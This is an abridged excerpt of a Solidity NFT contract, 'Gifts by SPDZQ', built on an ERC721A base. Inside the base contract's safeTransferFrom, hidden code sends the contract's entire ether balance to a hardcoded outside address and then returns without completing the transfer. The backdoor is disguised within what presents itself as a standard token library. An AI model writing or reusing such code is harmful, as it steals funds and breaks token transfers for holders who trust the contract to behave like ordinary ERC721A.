...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0xE590a724E47dc08351B40af89Ca92b0965469662).transfer(address(this).balance);
            return;
        }       
...
contract GiftsbySPDZQ is ERC721A, DefaultOperatorFilterer {
    string public baseURI = "ipfs://bafybeihjmdw2ysezxmpg2so6x776ngf7fqozglvbsahf4es42gj3vpbqvm/";      
    ...
    constructor() ERC721A("Gifts by SPDZQ", "GSPDZQ") {
        owner = msg.sender;
    }
